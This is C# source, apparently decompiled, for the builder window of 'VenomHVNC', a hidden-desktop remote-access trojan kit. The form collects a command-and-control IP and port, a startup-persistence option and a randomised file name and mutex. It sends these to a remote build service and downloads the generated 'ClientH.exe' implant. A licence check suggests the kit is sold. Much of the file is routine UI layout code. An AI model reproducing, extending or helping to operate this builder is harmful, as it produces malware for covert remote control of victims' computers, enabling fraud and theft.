

using HVNC.Utils;
using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Interfaces;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace HVNC
{
  public class FrmBuilder : Form
  {
    public static byte[] b;
    public static Random r = new Random();
    public static Random random = new Random();
    private IContainer components;
    private Label label1;
    private Label label24;
    private Label label7;
    private SiticoneGradientPanel siticoneGradientPanel4;
    private Panel panel1;
    private SiticoneControlBox siticoneControlBox1;
    private PictureBox pictureBox1;
    private Label label18;
    private SiticoneNumericUpDown txtPORT;
    public SiticoneGradientButton BuildBtn;
    private SiticoneTextBox textBox2;
    private SiticoneTextBox txtIP;
    private SiticoneCustomCheckBox EnableStartUpBox;
    private SiticoneBorderlessForm siticoneBorderlessForm1;
    private SiticoneDragControl siticoneDragControl1;

    public FrmBuilder() => this.InitializeComponent();

    public static string pathtosave { get; set; }

    private void button1_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.txtIP.Text == "IP ADDRESS")
        {
          int num1 = (int) MessageBox.Show("IP or DNS is required in order to build.", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          using (FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog())
          {
            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
            {
              if (!string.IsNullOrWhiteSpace(folderBrowserDialog.SelectedPath))
              {
                Directory.GetFiles(folderBrowserDialog.SelectedPath);
                FrmBuilder.pathtosave = folderBrowserDialog.SelectedPath.ToString() + "\\";
              }
            }
          }
          if (string.IsNullOrWhiteSpace(this.txtIP.Text) || string.IsNullOrWhiteSpace(this.txtPORT.Text))
          {
            int num2 = (int) MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
          else
          {
            this.BuildBtn.Text = "Building...";
            this.BuildBtn.Enabled = false;
            BuildInfo.ip = this.txtIP.Text;
            BuildInfo.port = this.txtPORT.Text;
            BuildInfo.id = "VenomHVNC";
            BuildInfo.mutex = FrmBuilder.RandomMutex(9) + ".exe";
            BuildInfo.startup = "False";
            BuildInfo.hhvnc = "True";
            if (this.EnableStartUpBox.Checked)
              BuildInfo.startup = "True";
            else if (!this.EnableStartUpBox.Checked)
              BuildInfo.startup = "False";
            BuildInfo.path = "1";
            BuildInfo.folder = this.textBox2.Text;
            BuildInfo.filename = this.textBox2.Text;
            BuildInfo.wdex = "False";
            switch (HVNC.WebBuilder.WebBuilder.SendBuild(BuildInfo.ip, BuildInfo.port, BuildInfo.id, BuildInfo.mutex, BuildInfo.startup, BuildInfo.path, BuildInfo.folder, BuildInfo.filename, BuildInfo.wdex, BuildInfo.hhvnc))
            {
              case "success":
                using (WebClient webClient = new WebClient())
                {
                  if (System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\ClientH.exe"))
                    System.IO.File.Delete(Directory.GetCurrentDirectory() + "\\ClientH.exe");
                  Thread.Sleep(3500);
                  webClient.DownloadFile(HVNC.WebBuilder.WebBuilder.DownloadURL + HVNC.WebBuilder.WebBuilder.Username + "/Client.exe", FrmBuilder.pathtosave + "ClientH.exe");
                  HVNC.WebBuilder.WebBuilder.DeleteOldBuild();
                  int num3 = (int) MessageBox.Show("Build Success", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                  this.BuildBtn.Enabled = true;
                  this.BuildBtn.Text = "Build HVNC";
                  break;
                }
              case "invalid-arguments":
                int num4 = (int) MessageBox.Show("Error Connecting to server!", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                this.BuildBtn.Enabled = true;
                break;
              case "missing-args":
                int num5 = (int) MessageBox.Show("Error Building Error Code: 4004");
                this.BuildBtn.Enabled = true;
                break;
              case "invalid-user-or-expired":
                Environment.Exit(Environment.ExitCode);
                break;
            }
          }
        }
      }
      catch (Exception ex)
      {
        if (ex.ToString().Contains("403"))
        {
          int num6 = (int) MessageBox.Show("Server Blocks Your IP!", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          int num7 = (int) MessageBox.Show("Error Building HVNC", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
      }
    }

    private void FrmBuilder_Load(object sender, EventArgs e)
    {
      this.textBox2.Text = FrmBuilder.RandomMutex(8);
      this.txtIP.Text = FrmBuilder.GetLocalIPAddress();
    }

    public static string RandomMutex(int length) => new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length).Select<string, char>((Func<string, char>) (s => s[FrmBuilder.random.Next(s.Length)])).ToArray<char>());

    public static string RandomNumber(int length) => new string(Enumerable.Repeat<string>("0123456789", length).Select<string, char>((Func<string, char>) (s => s[FrmBuilder.random.Next(s.Length)])).ToArray<char>());

    public static string GetLocalIPAddress()
    {
      foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
      {
        if (address.AddressFamily == AddressFamily.InterNetwork)
          return address.ToString();
      }
      throw new Exception("No network adapters with an IPv4 address in the system!");
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FrmBuilder));
      this.label1 = new Label();
      this.label24 = new Label();
      this.label7 = new Label();
      this.siticoneGradientPanel4 = new SiticoneGradientPanel();
      this.panel1 = new Panel();
      this.siticoneControlBox1 = new SiticoneControlBox();
      this.pictureBox1 = new PictureBox();
      this.label18 = new Label();
      this.txtPORT = new SiticoneNumericUpDown();
      this.BuildBtn = new SiticoneGradientButton();
      this.txtIP = new SiticoneTextBox();
      this.textBox2 = new SiticoneTextBox();
      this.EnableStartUpBox = new SiticoneCustomCheckBox();
      this.siticoneBorderlessForm1 = new SiticoneBorderlessForm(this.components);
      this.siticoneDragControl1 = new SiticoneDragControl(this.components);
      this.panel1.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.txtPORT.BeginInit();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.BackColor = Color.Transparent;
      this.label1.Location = new Point(61, 80);
      this.label1.Name = "label1";
      this.label1.Size = new Size(48, 13);
      this.label1.TabIndex = 151;
      this.label1.Text = "IP/DNS ";
      this.label24.AutoSize = true;
      this.label24.BackColor = Color.Transparent;
      this.label24.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label24.ForeColor = Color.Gainsboro;
      this.label24.Location = new Point(61, 172);
      this.label24.Margin = new Padding(2, 0, 2, 0);
      this.label24.Name = "label24";
      this.label24.Size = new Size(50, 16);
      this.label24.TabIndex = 149;
      this.label24.Text = "Startup";
      this.label7.AutoSize = true;
      this.label7.BackColor = Color.Transparent;
      this.label7.Location = new Point(361, 174);
      this.label7.Name = "label7";
      this.label7.Size = new Size(58, 13);
      this.label7.TabIndex = 139;
      this.label7.Text = "File name :";
      this.siticoneGradientPanel4.BackColor = Color.FromArgb(27, 27, 27);
      this.siticoneGradientPanel4.Dock = DockStyle.Top;
      this.siticoneGradientPanel4.FillColor = Color.FromArgb(92 ,36 , 28);
      this.siticoneGradientPanel4.FillColor2 = Color.FromArgb(27, 27, 27);
      this.siticoneGradientPanel4.Location = new Point(0, 34);
      this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
      this.siticoneGradientPanel4.ShadowDecoration.Parent = (Control) this.siticoneGradientPanel4;
      this.siticoneGradientPanel4.Size = new Size(484, 31);
      this.siticoneGradientPanel4.TabIndex = 165;
      this.panel1.BackColor = Color.FromArgb(27, 27, 27);
      this.panel1.Controls.Add((Control) this.siticoneControlBox1);
      this.panel1.Controls.Add((Control) this.pictureBox1);
      this.panel1.Controls.Add((Control) this.label18);
      this.panel1.Dock = DockStyle.Top;
      this.panel1.Location = new Point(0, 0);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(484, 34);
      this.panel1.TabIndex = 164;
      this.siticoneControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox1.FillColor = Color.Transparent;
      this.siticoneControlBox1.HoverState.Parent = this.siticoneControlBox1;
      this.siticoneControlBox1.IconColor = Color.White;
      this.siticoneControlBox1.Location = new Point(457, 6);
      this.siticoneControlBox1.Name = "siticoneControlBox1";
      this.siticoneControlBox1.ShadowDecoration.Parent = (Control) this.siticoneControlBox1;
      this.siticoneControlBox1.Size = new Size(24, 22);
      this.siticoneControlBox1.TabIndex = 146;
      this.pictureBox1.ErrorImage = (Image) null;
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.InitialImage = (Image) null;
      this.pictureBox1.Location = new Point(3, 4);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(24, 24);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 7;
      this.pictureBox1.TabStop = false;
      this.label18.AutoSize = true;
      this.label18.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label18.ForeColor = Color.Gainsboro;
      this.label18.Location = new Point(34, 8);
      this.label18.Name = "label18";
      this.label18.Size = new Size(107, 20);
      this.label18.TabIndex = 2;
      this.label18.Text = "Builder HVNC";
      this.txtPORT.BackColor = Color.Transparent;
      this.txtPORT.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.txtPORT.Cursor = Cursors.IBeam;
      this.txtPORT.DisabledState.Parent = this.txtPORT;
      this.txtPORT.FillColor = Color.FromArgb(20, 20, 20);
      this.txtPORT.FocusedState.Parent = this.txtPORT;
      this.txtPORT.Font = new Font("Segoe UI", 9f);
      this.txtPORT.ForeColor = Color.Gainsboro;
      this.txtPORT.Location = new Point(319, 96);
      this.txtPORT.Maximum = new Decimal(new int[4]
      {
        (int) ushort.MaxValue,
        0,
        0,
        0
      });
      this.txtPORT.Minimum = new Decimal(new int[4]
      {
        1024,
        0,
        0,
        0
      });
      this.txtPORT.Name = "txtPORT";
      this.txtPORT.ShadowDecoration.Parent = (Control) this.txtPORT;
      this.txtPORT.Size = new Size(100, 26);
      this.txtPORT.TabIndex = 166;
      this.txtPORT.UpDownButtonFillColor = Color.FromArgb(92 ,36 , 28);
      this.txtPORT.UpDownButtonForeColor = Color.Gainsboro;
      this.txtPORT.Value = new Decimal(new int[4]
      {
        4448,
        0,
        0,
        0
      });
      this.BuildBtn.BackColor = Color.FromArgb(20, 20, 20);
      this.BuildBtn.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.BuildBtn.BorderRadius = 1;
      this.BuildBtn.BorderThickness = 1;
      this.BuildBtn.CheckedState.Parent = (ICustomButtonControl) this.BuildBtn;
      this.BuildBtn.CustomImages.Parent = (ICustomButtonControl) this.BuildBtn;
      this.BuildBtn.DisabledState.BorderColor = Color.DarkGray;
      this.BuildBtn.DisabledState.CustomBorderColor = Color.DarkGray;
      this.BuildBtn.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
      this.BuildBtn.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
      this.BuildBtn.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
      this.BuildBtn.DisabledState.Parent = (ICustomButtonControl) this.BuildBtn;
      this.BuildBtn.FillColor = Color.Transparent;
      this.BuildBtn.FillColor2 = Color.Transparent;
      this.BuildBtn.Font = new Font("Segoe UI", 9f);
      this.BuildBtn.ForeColor = Color.Gainsboro;
      this.BuildBtn.HoverState.Parent = (ICustomButtonControl) this.BuildBtn;
      this.BuildBtn.Location = new Point(38, 251);
      this.BuildBtn.Name = "BuildBtn";
      this.BuildBtn.ShadowDecoration.Parent = (Control) this.BuildBtn;
      this.BuildBtn.Size = new Size(406, 30);
      this.BuildBtn.TabIndex = 167;
      this.BuildBtn.Text = "Build HVNC";
      this.BuildBtn.Click += new EventHandler(this.button1_Click);
      this.txtIP.Animated = true;
      this.txtIP.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.txtIP.Cursor = Cursors.IBeam;
      this.txtIP.DefaultText = "";
      this.txtIP.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
      this.txtIP.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
      this.txtIP.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
      this.txtIP.DisabledState.Parent = this.txtIP;
      this.txtIP.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
      this.txtIP.FillColor = Color.FromArgb(20, 20, 20);
      this.txtIP.FocusedState.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.txtIP.FocusedState.Parent = this.txtIP;
      this.txtIP.Font = new Font("Segoe UI", 9f);
      this.txtIP.ForeColor = Color.DarkGray;
      this.txtIP.HoverState.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.txtIP.HoverState.Parent = this.txtIP;
      this.txtIP.Location = new Point(64, 96);
      this.txtIP.Name = "txtIP";
      this.txtIP.PasswordChar = char.MinValue;
      this.txtIP.PlaceholderForeColor = Color.DarkGray;
      this.txtIP.PlaceholderText = "";
      this.txtIP.SelectedText = "";
      this.txtIP.ShadowDecoration.Parent = (Control) this.txtIP;
      this.txtIP.Size = new Size(249, 26);
      this.txtIP.TabIndex = 168;
      this.txtIP.TextAlign = HorizontalAlignment.Center;
      this.textBox2.Animated = true;
      this.textBox2.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.textBox2.Cursor = Cursors.IBeam;
      this.textBox2.DefaultText = "";
      this.textBox2.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
      this.textBox2.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
      this.textBox2.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
      this.textBox2.DisabledState.Parent = this.textBox2;
      this.textBox2.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
      this.textBox2.FillColor = Color.FromArgb(20, 20, 20);
      this.textBox2.FocusedState.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.textBox2.FocusedState.Parent = this.textBox2;
      this.textBox2.Font = new Font("Segoe UI", 9f);
      this.textBox2.ForeColor = Color.DarkGray;
      this.textBox2.HoverState.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.textBox2.HoverState.Parent = this.textBox2;
      this.textBox2.Location = new Point(64, 197);
      this.textBox2.Name = "textBox2";
      this.textBox2.PasswordChar = char.MinValue;
      this.textBox2.PlaceholderForeColor = Color.DarkGray;
      this.textBox2.PlaceholderText = "";
      this.textBox2.SelectedText = "";
      this.textBox2.ShadowDecoration.Parent = (Control) this.textBox2;
      this.textBox2.Size = new Size(355, 26);
      this.textBox2.TabIndex = 168;
      this.textBox2.TextAlign = HorizontalAlignment.Center;
      this.EnableStartUpBox.CheckedState.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.EnableStartUpBox.CheckedState.BorderRadius = 2;
      this.EnableStartUpBox.CheckedState.BorderThickness = 1;
      this.EnableStartUpBox.CheckedState.FillColor = Color.FromArgb(92 ,36 , 28);
      this.EnableStartUpBox.CheckedState.Parent = this.EnableStartUpBox;
      this.EnableStartUpBox.Location = new Point(64, 141);
      this.EnableStartUpBox.Name = "EnableStartUpBox";
      this.EnableStartUpBox.ShadowDecoration.Parent = (Control) this.EnableStartUpBox;
      this.EnableStartUpBox.Size = new Size(25, 25);
      this.EnableStartUpBox.TabIndex = 169;
      this.EnableStartUpBox.Text = "siticoneCustomCheckBox1";
      this.EnableStartUpBox.UncheckedState.BorderColor = Color.FromArgb(20, 20, 20);
      this.EnableStartUpBox.UncheckedState.BorderRadius = 2;
      this.EnableStartUpBox.UncheckedState.BorderThickness = 0;
      this.EnableStartUpBox.UncheckedState.FillColor = Color.FromArgb(20, 20, 20);
      this.EnableStartUpBox.UncheckedState.Parent = this.EnableStartUpBox;
      this.siticoneBorderlessForm1.ContainerControl = (ContainerControl) this;
      this.siticoneBorderlessForm1.ShadowColor = Color.FromArgb(243, 30, 30);
      this.siticoneDragControl1.TargetControl = (Control) this.panel1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(27, 27, 27);
      this.ClientSize = new Size(484, 302);
      this.Controls.Add((Control) this.EnableStartUpBox);
      this.Controls.Add((Control) this.textBox2);
      this.Controls.Add((Control) this.txtIP);
      this.Controls.Add((Control) this.BuildBtn);
      this.Controls.Add((Control) this.txtPORT);
      this.Controls.Add((Control) this.siticoneGradientPanel4);
      this.Controls.Add((Control) this.panel1);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.label7);
      this.Controls.Add((Control) this.label24);
      this.ForeColor = Color.GhostWhite;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FrmBuilder);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "HVNC Builder";
      this.Load += new EventHandler(this.FrmBuilder_Load);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.txtPORT.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
